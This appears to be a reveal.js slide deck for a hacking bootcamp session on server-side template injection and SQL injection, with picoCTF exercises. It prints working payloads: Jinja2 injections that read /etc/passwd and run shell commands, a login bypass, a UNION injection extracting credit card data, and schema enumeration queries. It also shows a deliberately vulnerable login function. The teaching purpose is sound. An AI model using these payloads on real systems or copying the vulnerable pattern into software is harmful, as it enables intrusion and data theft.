@@ -1,0 +1,1223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!-- Generated on 2026-03-28 Sat 13:30 -->
+<meta charset="utf-8"/>
+<title>Hacking Bootcamp S6: <code>;DROP flags --</code></title>
+<style type="text/css">
+.underline { text-decoration: underline; }
+</style>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js/dist/reveal.css"/>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js/dist/theme/dracula.css" id="theme"/>
+
+<link rel="stylesheet" href="./local.css"/>
+</head>
+<body>
+<div class="reveal">
+<div class="slides">
+<section id="sec-title-slide">
+<h1>Hacking Bootcamp S6: <code>;DROP flags --</code></h1><h2></h2>
+</section>
+<section>
+<section id="slide-org7d43638">
+<h2 id="org7d43638">Today</h2>
+<div style="font-size: 90%">
+<ul>
+<li>Dynamic web pages
+<ul>
+<li>Server-side template injection</li>
+
+</ul></li>
+<li>SQL</li>
+<li>SQL injection</li>
+<li>Database introspection</li>
+<li>Hack time!</li>
+
+</ul>
+</div>
+</section>
+</section>
+<section>
+<section id="slide-orgca9503b">
+<h2 id="orgca9503b">Tools</h2>
+<p>
+Install please:
+</p>
+<ul>
+<li>Burp Suite</li>
+
+</ul>
+</section>
+</section>
+<section>
+<section id="slide-org42ee649">
+<h2 id="org42ee649">Dynamic web pages</h2>
+<p>
+While an HTTP request to a site will usually deliver HTML content, this content may not be always static
+</p>
+
+<p>
+Think a social media or news site, the information displayed varies though the day
+</p>
+</section>
+</section>
+<section>
+<section id="slide-org8813228">
+<h3 id="org8813228">Client-side dynamic web pages</h3>
+<p>
+The dynamism can occur client-side by loading an initial HTML and scripts (JS) that make subsequent requests that modify the DOM with the dynamic content
+</p>
+</section>
+<section id="slide-org99246aa">
+<h4 id="org99246aa">Example</h4>
+<div class="org-src-container">
+
+<pre class="src src-html">&lt;<span style="color: #b9ca4a;">!DOCTYPE</span> html&gt;
+&lt;<span style="color: #e78c45;">html</span>&gt;
+  &lt;<span style="color: #e78c45;">head</span>&gt;
+    &lt;<span style="color: #e78c45;">title</span>&gt;<span style="font-weight: bold; text-decoration: underline;">View user</span>&lt;/<span style="color: #e78c45;">title</span>&gt;
+  &lt;/<span style="color: #e78c45;">head</span>&gt;
+  &lt;<span style="color: #e78c45;">body</span>&gt;
+    &lt;<span style="color: #e78c45;">p</span> <span style="color: #e7c547;">id</span>=<span style="color: #70c0b1;">"output"</span>&gt;Loading...&lt;/<span style="color: #e78c45;">p</span>&gt;
+
+    &lt;<span style="color: #e78c45;">script</span>&gt;
+      fetch("/user")
+        .then((response) =&gt; response.json())
+        .then((data) =&gt; {
+          document.getElementById("output").textContent =
+            data.name + " (" + data.email + ")";
+        })
+        .catch(() =&gt; {
+          document.getElementById("output").textContent =
+            "Failed to load data.";
+        });
+    &lt;/<span style="color: #e78c45;">script</span>&gt;
+  &lt;/<span style="color: #e78c45;">body</span>&gt;
+&lt;/<span style="color: #e78c45;">html</span>&gt;
+</pre>
+</div>
+
+<p>
+The server would implement the <code>/user</code> endpoint and have it return the appropriate
+information.
+</p>
+</section>
+</section>
+<section>
+<section id="slide-org6bfbab7">
+<h3 id="org6bfbab7">Server-side dynamic web pages</h3>
+<p>
+Instead of the client building the page, the server can build the response HTML
+using server-side scripts (e.g., PHP, Python, Node).
+</p>
+</section>
+</section>
+<section>
+<section id="slide-org8a3d196">
+<h3 id="org8a3d196">Server-side templates</h3>
+<p>
+Instead of having to create the response HTML by doing many string operations, we can specify some skeleton for the response and have values placed into the skeleton when generating the response.
+</p>
+
+<p>
+Server-side templates specify that skeleton, some logic and variables that must be passed to render the template.
+</p>
+</section>
+<section id="slide-org11907c7">
+<h4 id="org11907c7">Example</h4>
+<p>
+<code>templates/base.html</code>
+</p>
+<pre class="example">
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;{{ title }}&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;header&gt;
+        &lt;h1&gt;Flask App&lt;/h1&gt;
+        &lt;hr&gt;
+    &lt;/header&gt;
+
+    {% block content %}{% endblock %}
+&lt;/body&gt;
+&lt;/html&gt;
+</pre>
+
+</section>
+<section>
+
+<p>
+<code>templates/index.html</code>
+</p>
+<pre class="example">
+{% extends "base.html" %}
+
+{% block content %}
+    &lt;h2&gt;Fruit List&lt;/h2&gt;
+    &lt;ul&gt;
+        {% for item in items %}
+            &lt;li&gt;{{ item }}&lt;/li&gt;
+        {% endfor %}
+    &lt;/ul&gt;
+{% endblock %}
+</pre>
+
+</section>
+<section>
+
+<p>
+<code>app.py</code>
+</p>
+<div class="org-src-container">
+
+<pre class="src src-python"><span style="color: #b9ca4a;">from</span> flask <span style="color: #b9ca4a;">import</span> Flask, render_template
+
+<span style="color: #e7c547;">app</span> <span style="color: #e78c45;">=</span> Flask(<span style="color: #c397d8;">__name__</span>)
+
+<span style="color: #7aa6da;">@app.route</span>(<span style="color: #70c0b1;">"/"</span>)
+<span style="color: #b9ca4a;">def</span> <span style="color: #e78c45;">home</span>():
+    <span style="color: #e7c547;">items</span> <span style="color: #e78c45;">=</span> [<span style="color: #70c0b1;">"Apples"</span>, <span style="color: #70c0b1;">"Bananas"</span>, <span style="color: #70c0b1;">"Cherries"</span>]
+    <span style="color: #b9ca4a;">return</span> render_template(<span style="color: #70c0b1;">"index.html"</span>, title<span style="color: #e78c45;">=</span><span style="color: #70c0b1;">"Home"</span>, items<span style="color: #e78c45;">=</span>items)
+
+<span style="color: #b9ca4a;">if</span> <span style="color: #c397d8;">__name__</span> <span style="color: #e78c45;">==</span> <span style="color: #70c0b1;">"__main__"</span>:
+    app.run()
+</pre>
+</div>
+</section>
+</section>
+<section>
+<section id="slide-orgfb5b625">
+<h2 id="orgfb5b625">Server-side template injection (SSTI)</h2>
+<p>
+While passing variables to the template render function is usually safe (the programming language and templating engine take care of that), direct string interpolation into template code is usually not.
+</p>
+
+<p>
+If we manage to inject code into the template before it&rsquo;s rendered, we could have that code execute in the server while the template is inflated.
+</p>
+</section>
+</section>
+<section>
+<section id="slide-org5b58d4b">
+<h3 id="org5b58d4b">Identifying possible injection</h3>
+<p>
+We can notice server side rendering when a page request varies its response and no client side rendering is being done.
+</p>
+
+<p>
+We may be asked to fill a form and get some HTML response back with some portion of the form reflected.
+</p>
+</section>
+</section>
+<section>
+<section id="slide-org6298872">
+<h3 id="org6298872">Testing</h3>
+<p>
+We can try testing for some basic injections in the possible vulnerable
+parameters and see if we manage to execute code or have the server respond 500.
+</p>
+</section>
+</section>
+<section>
+<section id="slide-org6384066">
+<h3 id="org6384066">Templating languages</h3>
+<div style="float: left; width: 50%">
+<p>
+The testing payloads and exploitation routes depend on the templating engine used in the backend.
+</p>
+
+<p>
+This varies according to the programming language used and programming languages may have different templating engines availables
+</p>
+</div>
+
+<div style="float: right; width: 50%">
+
+<div id="orga959b3f" class="figure">
+<p><img src="img/template-identification.png" alt="template-identification.png" />
+</p>
+</div>
+</div>
+
+</section>
+<section>
+
+<p>
+A general payload that should 500 many templates engines is:
+</p>
+<pre class="example">
+${{&lt;%[%'"}}%\.
+</pre>
+
+</section>
+<section>
+
+<p>
+Once identified the templating engine, we should consult the documentation of the template engine and the programming language to find how to exploit it.
+</p>
+
+<p>
+Or use resources like <a href="https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html">HackTricks</a> and <a href="https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/">PayloadsAllTheThings</a>.
+</p>
+</section>
+</section>
+<section>
+<section id="slide-orgc472230">
+<h3 id="orgc472230">Jinja2</h3>
+<p>
+Jinja is a templating engine for Python web frameworks (e.g., Flask, Django).
+</p>
+
+<p>
+Expressions are evaluated like <code>{{ exp }}</code>, but we are restricted to what&rsquo;s present in the Jinja environment.
+</p>
+
+<pre class="example">
+{{ 7 * 7 }}
+</pre>
+<p>
+Would result in <code>49</code>.
+</p>
+</section>
+<section id="slide-orgd7e0a52">
+<h4 id="orgd7e0a52">Payload examples</h4>
+<p>
+Read files:
+</p>
+<pre class="example">
+{{ ''.__class__.__mro__[2].__subclasses__() }}
+</pre>
+<p>
+We get a list of classes, locate <code>File</code>.
+</p>
+
+<p>
+Assuming it&rsquo;s <code>40</code>.
+</p>
+<pre class="example">
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+</pre>
+
+<p>
+Execute commands:
+</p>
+<pre class="example">
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+</pre>
+
+<p>
+We may have to adapt our payloads to work properly in the server instance.
+</p>
+</section>
+<section id="slide-orge8e7c3f">
+<h4 id="orge8e7c3f">Template examples</h4>
+<p>
+<b>TODO</b>
+</p>
+</section>
+</section>
+<section>
+<section id="slide-org1f3193f">
+<h2 id="org1f3193f">Exercises</h2>
+<ul>
+<li>SSTI1
+<a href="https://play.picoctf.org/practice/challenge/492">https://play.picoctf.org/practice/challenge/492</a></li>
+<li>SSTI2
+<a href="https://play.picoctf.org/practice/challenge/488">https://play.picoctf.org/practice/challenge/488</a></li>
+
+</ul>
+</section>
+</section>
+<section>
+<section id="slide-org0c45688">
+<h2 id="org0c45688">SQL databases</h2>
+<p>
+Web applications store data on databases.
+</p>
+
+<p>
+The most common storage are SQL databases.
+</p>
+
+<p>
+SQL queries are used by the web application to retrieve data from the DB.
+</p>
+
+<p>
+This means that client requests cause SQL statements to be executed, probably with some user controlled arguments used.
+</p>
+
+
+<div id="orgb7d3d3d" class="figure">
+<p><img src="img/web_server_layers.png" alt="web_server_layers.png" />
+</p>
+</div>
+</section>
+</section>
+<section>
+<section id="slide-orge2f9e95">
+<h2 id="orge2f9e95">SQL</h2>
+<p>
+While there are many SQL DBMS that vary in some syntax and semantics details, they adhere to a common ISO standard for the <i>Structured Query Language</i>.
+</p>
+
+<p>
+There are SQL statements for retrieving, updating, deleting, and inserting data.
+</p>
+
+<p>
+There are SQL statements for managing database objects (tables, schemas, users).
+</p>
+</section>
+</section>
+<section>
+<section id="slide-org08f0333">
+<h3 id="org08f0333">Tables</h3>
+<p>
+A SQL table is a set of tuples (or rows) with common headings (i.e., a position
+represent some attribute in each tuple).
+</p>
+
+
+<div id="org3117cc8" class="figure">
+<p><img src="img/sql-table.png" alt="sql-table.png" />
+</p>
+</div>
+</section>
+<section id="slide-org5309c3d">
+<h4 id="org5309c3d">Definition example</h4>
+<div class="org-src-container">
+
+<pre class="src src-sql"><span style="color: #b9ca4a;">CREATE</span> <span style="color: #b9ca4a;">TABLE</span> <span style="color: #e78c45;">logins</span> (
+    id <span style="color: #7aa6da;">INT</span>,
+    username <span style="color: #7aa6da;">VARCHAR</span>(100),
+    password <span style="color: #7aa6da;">VARCHAR</span>(100),
+    date_of_joining DATETIME
+    );
+</pre>
+</div>
+</section>
+</section>
+<section>
+<section id="slide-orgf0ff569">
+<h3 id="orgf0ff569">Schemas</h3>
+<p>
+A schema is a grouping of SQL tables.
+</p>
+
+<p>
+Generally one application will use one schema for its data. Other applications may reuse the DB by specifying their own schema.
+</p>
+
+<p>
+SQL statements are executed in the context of a schema on which unqualified tables will be searched (table names can reoccur among schemas).
+</p>
+
+<p>
+Nonetheless, schemas can be specified on a per table basis like <code>schema.table</code>.
+</p>
+
+<p>
+Note: SQLite does not use schemas, all tables live in the same namespace.
+</p>
+</section>
+</section>
+<section>
+<section id="slide-org747b086">
+<h3 id="org747b086"><code>INSERT</code></h3>
+<p>
+Insert rows into a table.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sql"><span style="color: #b9ca4a;">INSERT</span> <span style="color: #b9ca4a;">INTO</span> <span style="color: #b9ca4a;">table_name</span> <span style="color: #b9ca4a;">VALUES</span> (column1_value, column2_value, column3_value, ...);
+</pre>
+</div>
+</section>
+</section>
+<section>
+<section id="slide-orgbecc797">
+<h3 id="orgbecc797"><code>SELECT</code></h3>
+<p>
+Select data from a table.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sql"><span style="color: #b9ca4a;">SELECT</span> column1, column2 <span style="color: #b9ca4a;">FROM</span> <span style="color: #b9ca4a;">table_name</span>;
+</pre>
+</div>
+
+<p>
+The column names must be present in the table.
+</p>
+
+</section>
+<section>
+
+<p>
+We can query for all columns with <code>*</code>.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sql"><span style="color: #b9ca4a;">SELECT</span> * <span style="color: #b9ca4a;">FROM</span> <span style="color: #b9ca4a;">table_name</span>;
+</pre>
+</div>
+
+</section>
+<section>
+
+<p>
+We can also evaluate expressions among columns.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sql"><span style="color: #b9ca4a;">SELECT</span> column1 * column2 <span style="color: #b9ca4a;">FROM</span> <span style="color: #b9ca4a;">table_name</span>;
+</pre>
+</div>
+
+<p>
+And even use literals
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sql"><span style="color: #b9ca4a;">SELECT</span> 100 + column1 <span style="color: #b9ca4a;">FROM</span> <span style="color: #b9ca4a;">table_name</span>;
+</pre>
+</div>
+</section>
+<section id="slide-org3178c89">
+<h4 id="org3178c89">WHERE</h4>
+<p>
+We can filter results of <code>SELECT</code> queries.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sql"><span style="color: #b9ca4a;">SELECT</span> * <span style="color: #b9ca4a;">FROM</span> <span style="color: #b9ca4a;">table_name</span> <span style="color: #b9ca4a;">WHERE</span> &lt;expression&gt;;
+</pre>
+</div>
+
+<p>
+Possible expressions are:
+</p>
+<div class="org-src-container">
+
+<pre class="src src-sql">exp1 &lt; exp2
+</pre>
+</div>
+
+<p>
+Also <code>&lt;=</code>, <code>&gt;</code>, and so.
+</p>
+
+<p>
+Expressions may be literals (e.g., <code>'ABC</code>, <code>2</code>) or column names to refer to the corresponding value in a tuple (the condition is evaluated for each row).
+</p>
+
+<p>
+Likewise, each expression may be other expressions to create complex filters.
+</p>
+
+</section>
+<section>
+
+<div class="org-src-container">
+
+<pre class="src src-sql">exp1 = exp2
+exp1 != exp2
+</pre>
+</div>
+<p>
+Test equality and inequality.
+</p>
+
+</section>
+<section>
+
+<div class="org-src-container">
+
+<pre class="src src-sql">exp1 <span style="color: #b9ca4a;">AND</span> exp2
+</pre>
+</div>
+
+<p>
+And between two expressions.
+</p>
+
+</section>
+<section>
+
+<div class="org-src-container">
+
+<pre class="src src-sql">exp1 <span style="color: #b9ca4a;">OR</span> exp2
+</pre>
+</div>
+
+<p>
+Or between two expressions.
+</p>
+
+</section>
+<section>
+
+<div class="org-src-container">
+
+<pre class="src src-sql"><span style="color: #b9ca4a;">NOT</span> exp
+</pre>
+</div>
+
+<p>
+Negates expression result.
+</p>
+
+</section>
+<section>
+
+<p>
+Operator precedence is defined in the usual way (e.g., <a href="https://mariadb.com/docs/server/reference/sql-structure/operators/operator-precedence">MariaDB</a>).
+</p>
+
+<p>
+We can group expressions to force precedence
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sql">(exp)
+</pre>
+</div>
+</section>
+<section id="slide-org128de90">
+<h4 id="org128de90">Example</h4>
+<p>
+A possible query to check for user credentials could be:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sql"><span style="color: #b9ca4a;">SELECT</span> * <span style="color: #b9ca4a;">FROM</span> <span style="color: #c397d8;">user</span> <span style="color: #b9ca4a;">WHERE</span> username = <span style="color: #70c0b1;">'tom'</span> <span style="color: #b9ca4a;">AND</span> password = <span style="color: #70c0b1;">'toor'</span>;
+</pre>
+</div>
+</section>
+</section>
+<section>
+<section id="slide-orgfdc76ce">
+<h3 id="orgfdc76ce"><code>UPDATE</code></h3>
+<p>
+Update (modify in place) rows in a table.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sql"><span style="color: #b9ca4a;">UPDATE</span> <span style="color: #b9ca4a;">table_name</span> <span style="color: #b9ca4a;">SET</span> column1=newvalue1, column2=newvalue2, ... <span style="color: #b9ca4a;">WHERE</span> &lt;condition&gt;;
+</pre>
+</div>
+
+<p>
+The possible <code>condition</code> are the same as for the <code>SELECT</code> statements.
+</p>
+</section>
+</section>
+<section>
+<section id="slide-orga2f9375">
+<h2 id="orga2f9375">SQL injection</h2>
+<p>
+Same as in SSTI, there are safe ways of adding user parameters to queries.
+</p>
+
+<p>
+Parameterized query:
+</p>
+<div class="org-src-container">
+
+<pre class="src src-python"><span style="color: #b9ca4a;">def</span> <span style="color: #e78c45;">login</span>(username, password):
+    <span style="color: #e7c547;">conn</span> <span style="color: #e78c45;">=</span> sqlite3.connect(<span style="color: #70c0b1;">"users.db"</span>)
+    <span style="color: #e7c547;">cursor</span> <span style="color: #e78c45;">=</span> conn.cursor()
+
+    cursor.execute(
+        <span style="color: #70c0b1;">"SELECT * FROM users WHERE username = ? AND password = ?"</span>,
+        (username, password)
+    )
+
+    <span style="color: #e7c547;">result</span> <span style="color: #e78c45;">=</span> cursor.fetchone()
+    conn.close()
+
+    <span style="color: #b9ca4a;">return</span> result
+</pre>
+</div>
+
+</section>
+<section>
+
+<p>
+But as in SSTI, raw string interpolation is vulnerable:
+</p>
+<div class="org-src-container">
+
+<pre class="src src-python"><span style="color: #b9ca4a;">def</span> <span style="color: #e78c45;">login</span>(username, password):
+    <span style="color: #e7c547;">conn</span> <span style="color: #e78c45;">=</span> sqlite3.connect(<span style="color: #70c0b1;">"users.db"</span>)
+    <span style="color: #e7c547;">cursor</span> <span style="color: #e78c45;">=</span> conn.cursor()
+
+    <span style="color: #e7c547;">query</span> <span style="color: #e78c45;">=</span> f<span style="color: #70c0b1;">"SELECT * FROM users WHERE username = '</span>{username}<span style="color: #70c0b1;">' AND password = '</span>{password}<span style="color: #70c0b1;">'"</span>
+    cursor.execute(query)
+
+    <span style="color: #e7c547;">result</span> <span style="color: #e78c45;">=</span> cursor.fetchone()
+    conn.close()
+
+    <span style="color: #b9ca4a;">return</span> result
+</pre>
+</div>
+
+</section>
+<section>
+
+<p>
+A normal user may give values that when interpolated result in the intended query.
+</p>
+
+<p>
+Take username = <code>john</code>, password = <code>neogeo</code>.
+</p>
+<div class="org-src-container">
+
+<pre class="src src-sql"><span style="color: #b9ca4a;">SELECT</span> * <span style="color: #b9ca4a;">FROM</span> users <span style="color: #b9ca4a;">WHERE</span> username = <span style="color: #70c0b1;">'john'</span> <span style="color: #b9ca4a;">AND</span> password = <span style="color: #70c0b1;">'neogeo'</span>
+</pre>
+</div>
+
+<p>
+But a malicious user could send username = <code>admin' --</code>, password = <code>pwnd</code>.
+</p>
+
+<p>
+The query would become:
+</p>
+<div class="org-src-container">
+
+<pre class="src src-sql"><span style="color: #b9ca4a;">SELECT</span> * <span style="color: #b9ca4a;">FROM</span> users <span style="color: #b9ca4a;">WHERE</span> username = <span style="color: #70c0b1;">'admin'</span> <span style="color: #969896;">-- </span><span style="color: #969896;">' AND password = 'pwnd'</span>
+</pre>
+</div>
+
+<p>
+As <code>--</code> is the line comment sequence for SQL, the rest of the query is ignored
+and the query is subverted.
+</p>
+</section>
+</section>
+<section>
+<section id="slide-orge3964ef">
+<h3 id="orge3964ef">SQL comments</h3>
+<p>
+The comment sequence for SQL is <code>--</code> , it indicates that the rest of the query line should be ignored.
+</p>
+
+<p>
+The sequences <code>/*</code> and <code>#</code> work in some RDBMs too.
+</p>
+</section>
+</section>
+<section>
+<section id="slide-orgd1216ef">
+<h2 id="orgd1216ef">Subverting queries</h2>
+<p>
+To inject into a query, we must have an idea of the query structure.
+</p>
+
+<p>
+In the previous example: <code>username = '{username}' AND password = '{password}'</code>,
+our input was surrounded by single quotes, so our payload was <code>admin' --</code> that
+escaped the quotes and then started a comment to ignore the rest of the query
+line that would be invalid syntax otherwise.
+</p>
+
+<p>
+We would like to get an error (500 probably) and a valid query to know that we have escaped the query structure.
+</p>
+
+</section>
+<section>
+
+<p>
+Some payloads to test are <code>'</code>, <code>"</code>, <code>#</code>, <code>;</code> and <code>)</code>.
+</p>
+
+</section>
+<section>
+
+<p>
+Once identified the surrounding context, we may inject the query to accomplish our objectives.
+</p>
+</section>
+</section>
+<section>
+<section id="slide-org5e93a64">
+<h2 id="org5e93a64">Exercises</h2>
+<ul>
+<li>SQLiLite
+<a href="https://play.picoctf.org/practice/challenge/304">https://play.picoctf.org/practice/challenge/304</a></li>
+<li>More SQLi
+<a href="https://play.picoctf.org/practice/challenge/358">https://play.picoctf.org/practice/challenge/358</a></li>
+<li>Irish-Name-Repo 1
+<a href="https://play.picoctf.org/practice/challenge/80">https://play.picoctf.org/practice/challenge/80</a></li>
+<li>Irish-Name-Repo 2
+<a href="https://play.picoctf.org/practice/challenge/59">https://play.picoctf.org/practice/challenge/59</a></li>
+<li>Irish-Name-Repo 3
+<a href="https://play.picoctf.org/practice/challenge/8">https://play.picoctf.org/practice/challenge/8</a></li>
+
+</ul>
+</section>
+</section>
+<section>
+<section id="slide-org35416ba">
+<h2 id="org35416ba"><code>UNION</code></h2>
+<p>
+We can combine results of multiple SQL queries in one single expression.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sql"><span style="color: #b9ca4a;">SELECT</span> * <span style="color: #b9ca4a;">FROM</span> T1 <span style="color: #b9ca4a;">UNION</span> <span style="color: #b9ca4a;">SELECT</span> * <span style="color: #b9ca4a;">FROM</span> T2;
+</pre>
+</div>
+
+<p>
+Both SELECT expressions <b>must return the same number of columns</b>. The column names
+don&rsquo;t matter, the names from the first query are used for all.
+</p>
+
+</section>
+<section>
+
+<p>
+If we don&rsquo;t know how many columns are being returned, we can try guessing with
+literals until we get a successful query.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sql"><span style="color: #b9ca4a;">SELECT</span> * <span style="color: #b9ca4a;">FROM</span> T1 <span style="color: #b9ca4a;">UNION</span> <span style="color: #b9ca4a;">SELECT</span> 1 <span style="color: #b9ca4a;">FROM</span> T2;
+<span style="color: #b9ca4a;">SELECT</span> * <span style="color: #b9ca4a;">FROM</span> T1 <span style="color: #b9ca4a;">UNION</span> <span style="color: #b9ca4a;">SELECT</span> 1, 2 <span style="color: #b9ca4a;">FROM</span> T2;
+<span style="color: #b9ca4a;">SELECT</span> * <span style="color: #b9ca4a;">FROM</span> T1 <span style="color: #b9ca4a;">UNION</span> <span style="color: #b9ca4a;">SELECT</span> 1, 2, 3 <span style="color: #b9ca4a;">FROM</span> T2;
+</pre>
+</div>
+
+<p>
+The second query would have 1 column, 2 columns, and 3 columns respectively.
+</p>
+</section>
+</section>
+<section>
+<section id="slide-org1c376c2">
+<h3 id="org1c376c2"><code>UNION</code> injection</h3>
+<p>
+Take our previous vulnerable query example:
+</p>
+<div class="org-src-container">
+
+<pre class="src src-python">    <span style="color: #e7c547;">query</span> <span style="color: #e78c45;">=</span> f<span style="color: #70c0b1;">"SELECT * FROM users WHERE username = '</span>{username}<span style="color: #70c0b1;">' AND password = '</span>{password}<span style="color: #70c0b1;">'"</span>
+</pre>
+</div>
+
+<p>
+We could have username = <code>AAA' UNION SELECT cc_numbers, cc_cvv FROM credit_cards --</code>, password = <code>pwnd</code>.
+</p>
+
+<p>
+The query would become:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sql"><span style="color: #b9ca4a;">SELECT</span> * <span style="color: #b9ca4a;">FROM</span> users <span style="color: #b9ca4a;">WHERE</span> username = <span style="color: #70c0b1;">'AAA'</span> <span style="color: #b9ca4a;">UNION</span> <span style="color: #b9ca4a;">SELECT</span> cc_numbers, cc_cvv, 3 <span style="color: #b9ca4a;">FROM</span> credit_cards <span style="color: #969896;">-- </span><span style="color: #969896;">' AND password = 'pwnd'</span>
+</pre>
+</div>
+
+<p>
+And (assuming we have the right number of columns) we would be getting credit card details back with our response.
+</p>
+</section>
+</section>
+<section>
+<section id="slide-org5730e57">
+<h2 id="org5730e57">String concatenation</h2>
+<p>
+DBMS support different syntax for concatenating strings.
+</p>
+
+<p>
+The two main ones are the function <code>CONCAT()</code> (most RDBMS) and the operator <code>||</code> (PostgreSQL, SQLite).
+</p>
+
+<pre class="example">
+CONCAT('A', 'B')
+'A' || 'B'
+</pre>
+
+<p>
+Both may result in in <code>'AB'</code>.
+</p>
+
+</section>
+<section>
+
+<p>
+We can use it to concatenate columns.
+</p>
+
+<p>
+In the previous example
+</p>
+<div class="org-src-container">
+
+<pre class="src src-sql"><span style="color: #b9ca4a;">SELECT</span> * <span style="color: #b9ca4a;">FROM</span> users <span style="color: #b9ca4a;">WHERE</span> username = <span style="color: #70c0b1;">'AAA'</span> <span style="color: #b9ca4a;">UNION</span> <span style="color: #b9ca4a;">SELECT</span> cc_numbers || <span style="color: #70c0b1;">':'</span> || cc_cvv <span style="color: #b9ca4a;">FROM</span> credit_cards <span style="color: #969896;">-- </span><span style="color: #969896;">' AND password = 'pwnd'</span>
+</pre>
+</div>
+
+<p>
+Would return <code>cc_numbers</code> and <code>cc_cvv</code> in a single column, which could be useful if we wanted to to return more values that columns we have visible in the output.
+</p>
+</section>
+</section>
+<section>
+<section id="slide-org99a9a31">
+<h2 id="org99a9a31">Column aggregation</h2>
+<p>
+While the previous syntax worked for concatenating values in the same tuple, we
+can also concatenate values across tuples to collapse them into a single row
+(subject to <code>GROUP BY</code>).
+</p>
+
+<pre class="example">
+STRING_AGG(row_expression, separator)  -- PostgreSQL, SQLite
+GROUP_CONCAT(row_expression SEPARATOR separator)  -- MySQL
+</pre>
+
+<p>
+The <code>row_expression</code> to concatenate could be a single column name (e.g., <code>user</code>) or
+some other expression (e.g., <code>user || password</code>, <code>CONCAT(user, password)</code>).
+</p>
+</section>
+</section>
+<section>
+<section id="slide-orgffa94ce">
+<h2 id="orgffa94ce">Database introspection</h2>
+<p>
+SQL databases store information about their schemas (e.g., schema names, table
+names, columns in table) into the database itself.
+</p>
+
+<p>
+This is usually in the special schema <a href="https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html"><code>information_schema</code></a>.
+</p>
+
+<p>
+Using this and <code>UNION</code>-injections we can enumerate the tables in a database.
+</p>
+</section>
+</section>
+<section>
+<section id="slide-org44ad040">
+<h3 id="org44ad040"><code>information_schema.schemata</code></h3>
+<p>
+Information about all schemas in the server
+</p>
+
+<p>
+Columns:
+</p>
+<ul>
+<li><code>schema_name</code>: Schema name</li>
+
+</ul>
+
+<div class="org-src-container">
+
+<pre class="src src-sql"><span style="color: #b9ca4a;">SELECT</span> <span style="color: #b9ca4a;">schema_name</span> <span style="color: #b9ca4a;">FROM</span> information_schema.schemata;
+</pre>
+</div>
+</section>
+</section>
+<section>
+<section id="slide-org7f66877">
+<h3 id="org7f66877"><code>information_schema.tables</code></h3>
+<p>
+Information about all tables in the server
+</p>
+
+<p>
+Columns:
+</p>
+<ul>
+<li><code>table_schema</code>: Schema containing the table</li>
+<li><code>table_name</code>: Table name</li>
+
+</ul>
+
+<div class="org-src-container">
+
+<pre class="src src-sql"><span style="color: #b9ca4a;">SELECT</span> <span style="color: #b9ca4a;">table_name</span> <span style="color: #b9ca4a;">FROM</span> information_schema.tables <span style="color: #b9ca4a;">WHERE</span> table_schema = <span style="color: #70c0b1;">'app'</span>;
+</pre>
+</div>
+</section>
+</section>
+<section>
+<section id="slide-orgdbc1dde">
+<h3 id="orgdbc1dde"><code>information_schema.columns</code></h3>
+<p>
+Information about the columns in every table
+</p>
+
+<p>
+Columns:
+</p>
+<ul>
+<li><code>table_schema</code>: Schema containing the table</li>
+<li><code>table_name</code>: Table name</li>
+<li><code>column_name</code>: Column name</li>
+<li><code>data_type</code>: Column data type</li>
+
+</ul>
+
+<div class="org-src-container">
+
+<pre class="src src-sql"><span style="color: #b9ca4a;">SELECT</span> <span style="color: #b9ca4a;">column_name</span>, data_type <span style="color: #b9ca4a;">FROM</span> information_schema.columns
+<span style="color: #b9ca4a;">WHERE</span> table_schema = <span style="color: #70c0b1;">'app'</span> <span style="color: #b9ca4a;">AND</span> <span style="color: #b9ca4a;">table_name</span> = <span style="color: #70c0b1;">'users'</span>;
+</pre>
+</div>
+</section>
+</section>
+<section>
+<section id="slide-orge169624">
+<h3 id="orge169624">Table enumeration</h3>
+<p>
+After locating interesting tables and columns we can do our usual SQL queries to get their data.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sql"><span style="color: #b9ca4a;">SELECT</span> <span style="color: #c397d8;">user</span>, password <span style="color: #b9ca4a;">FROM</span> users;
+</pre>
+</div>
+</section>
+<section id="slide-org41f7470">
+<h4 id="org41f7470">Password dumping</h4>
+<p>
+Passwords are usually stored not as plaintext but as some hash of the
+corresponding password.
+</p>
+
+<p>
+Search instructions for <code>john</code> / <code>hashcat</code> cracking or use <a href="https://crackstation.net">https://crackstation.net</a>
+</p>
+
+<p>
+More information to be seen in future cryptography session.
+</p>
+</section>
+</section>
+<section>
+<section id="slide-org2ff9628">
+<h3 id="org2ff9628"><code>sqlite_schema</code></h3>
+<p>
+For SQLite, we have a single table that contains the information about all tables in the database.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sql"><span style="color: #b9ca4a;">CREATE</span> <span style="color: #b9ca4a;">TABLE</span> <span style="color: #e78c45;">sqlite_schema</span>(
+  <span style="color: #b9ca4a;">type</span> text,
+  <span style="color: #b9ca4a;">name</span> text,
+  tbl_name text,
+  rootpage <span style="color: #7aa6da;">integer</span>,
+  <span style="color: #b9ca4a;">sql</span> text
+);
+</pre>
+</div>
+
+<p>
+From the <a href="https://www.sqlite.org/schematab.html">documentation</a>:
+</p>
+<ul>
+<li><code>type</code>: &rsquo;table&rsquo;, &rsquo;index&rsquo;, &rsquo;view&rsquo;, or &rsquo;trigger&rsquo;</li>
+<li><code>name</code>: name of the object</li>
+<li><code>sql</code>: SQL text that describes the object</li>
+
+</ul>
